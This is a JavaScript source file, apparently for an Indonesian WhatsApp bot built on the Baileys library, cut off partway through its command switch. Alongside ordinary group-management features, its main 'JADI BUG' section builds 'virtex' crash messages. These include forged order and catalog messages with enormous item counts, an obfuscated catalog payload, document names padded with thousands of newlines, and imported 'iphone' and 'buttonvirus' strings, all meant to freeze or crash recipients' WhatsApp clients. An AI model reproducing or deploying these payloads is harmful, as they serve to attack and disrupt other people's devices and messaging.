/*
// Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
   Apalagi Lari Dari Tanggung Jawab

// Base banghw Mods : Copyan Dari Base Dika

› Create By banghw
› Base Ori banghw
› Copyan Base Dika Hisoka Morou

🌷 KALAU MAU RENAME TARO CREDITS GUA : banghw*/

//=================================================//
require('./hwkal')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const os = require('os')
const mathjs = require('mathjs')
const chalk = require('chalk')
const { JSDOM } = require('jsdom')
const cl = require('caliph-api') 
const axios = require('axios')
const path = require('path')
const mel = require('kitsune-api')
const moment = require('moment-timezone')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { exec, spawn, execSync } = require("child_process")
const { virtex, vipi } = require('./baseikal/virtex/virtex.js')
const { ngazap } = require('./baseikal/virtex/ngazap')
const { buttonvirus } = require('./baseikal/virtex/buttonvirus')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { bugsw } = require('./baseikal/virtex/bugsw')
const { iphone } = require('./baseikal/virtex/iphone')
const { iphone1 } = require('./baseikal/virtex/iphone1')
const { iphone2 } = require('./baseikal/virtex/iphone2')
const { iphone3 } = require('./baseikal/virtex/iphone3')
const { iphone4 } = require('./baseikal/virtex/iphone4')
const { iphone5 } = require('./baseikal/virtex/iphone5')
const { iphone6 } = require('./baseikal/virtex/iphone6')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./baseikal/lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
// Read Database
global.db = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db) global.db = {
users: {},
chats: {},
database: {},
game: {},
settings: {},
others: {},
sticker: {},
...(global.db || {})
}

virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
const content = JSON.stringify(m.message)
/*const cerpen = require('./baseikal/lib/cerpen')*/
const kalimage = fs.readFileSync ('./baseikal/image/hwmodsgans.jpg')
const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
const { mediafireDl } = require('./baseikal/lib/mediafire.js')
const banned = JSON.parse(fs.readFileSync('./baseikal/dbnye/banned.json'))
const ntilink = JSON.parse(fs.readFileSync("./baseikal/lib/antilink.json"))
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = haikal = async (haikal, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await haikal.decodeJid(haikal.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const isBan = banned.includes(m.sender)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await haikal.groupMetadata(m.chat).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const welcm = m.isGroup ? wlcm.includes(from) : false
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
//=================================================//
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false
}}}
//=================================================//
const deploy = (teks) => {
  haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
//=================================================//
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © banghw`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })} 
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
} else global.db.chats[m.chat] = {
mute: false,
}
let settings = db.settings[botNumber]
if (typeof settings !== 'object') db.settings[botNumber] = {}
if (settings) {
if (!('available' in settings)) settings.available = true
if (!('composing' in settings)) settings.composing = false
if (!('recording' in settings)) settings.recording = false
} else db.settings[botNumber] = {
available: true,
composing: false,
recording: false,
}
} catch (err) {
console.log(err)
}
//=================================================//
if (!haikal.public) {
if (!m.key.fromMe) return
}
if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
}
//=================================================// 
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})
//=================================================// 
var sticWait = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/wait.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticAdmin = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/BotAdman.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticOwner = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/owner.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticSukses = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SuksesCok.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var sticBanLu = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/BanLu.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var groupon = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/groupon.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
var SiGroupadmin = (hehe) => {
ano = fs.readFileSync('./baseikal/stickernye/SiGroupadmin.webp')
haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
}
   // autovn
if(autorecording){
if(autorecording == false)
await haikal.sendPresenceUpdate('recording', m.chat)
} else if(autoketik){
if(autoketik == false)
await haikal.sendPresenceUpdate('composing', m.chat)
} else if(autoavailable){
if(autoavailable == true)
await haikal.sendPresenceUpdate('available', m.chat)
}
//=================================================//
// Mute Chat
if (db.chats[m.chat].mute && !isAdmins && !isCreator) {
return
}
// write database every 1 minute
setInterval(() => {
fs.writeFileSync('./src/database.json', JSON.stringify(global.db, null, 2))
}, 60 * 1000)
//=================================================//
// AntiLink
if (AntiLink) {
linkgce = await haikal.groupInviteCode(from)
if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
m.reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(m.text)) {
bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await haikal.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
haikal.sendMessage(from, {text:`\`\`\`「 Detect Link 」\`\`\`\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
}
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: haikal.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, haikal.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
haikal.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
//=================================================//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`
Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}
if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
Hello Saya Bot Hw Mods${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//
switch(command) {
//=================================================//
// JADI BUG /)

case 'jaditroli': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${teks}`,
"orderTitle": `${teks}`,
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
case 'jadilokas': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": ` ${teks} ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
case 'jadipolling': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": `Salam kenal saya ${teks}`,
"options": [
	{
"optionName": `Saya ${teks}`
	},
	{
"optionName": `Dimari Kalau Ada ${teks} Jangan lari`
	}
],
"selectableOptionsCount": 2
	}
}), { userJid: m.chat, quoted: m })
haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
}
break
case 'jadikatalog': case 'banghwkatalog': {
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image/sticker'
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281214281312','397419wzTxRp','6281214281312@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':kalimage,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':doc});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
}
}
break
case 'jadidocu': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break

//=================================================//
case 'jadidarknes': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
case 'jadivirtext1': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone}` }, { quoted: doc })
}
}
break
case 'jadivirtext2': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone1}` }, { quoted: doc })
}
}
break
case 'jadivirtex3t': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone2}` }, { quoted: doc })
}
}
break
case 'jadivirtext4': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone3}` }, { quoted: doc })
}
}
break
case 'jadivirtext5': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone4}` }, { quoted: doc })
}
}
break
case 'jadivirtext6': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone5}` }, { quoted: doc })
}
}
break
case 'jadivirtext7': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${iphone6}` }, { quoted: doc })
}
}
break
case 'jadivirtext8': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${buttonkal}` }, { quoted: doc })
}
}
break
case 'jadivirtext9': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${buttonvirus}` }, { quoted: doc })
}
}
break
case 'jadivirtext10': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted: doc })
}
}
break
case 'jadibuginvite': {
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
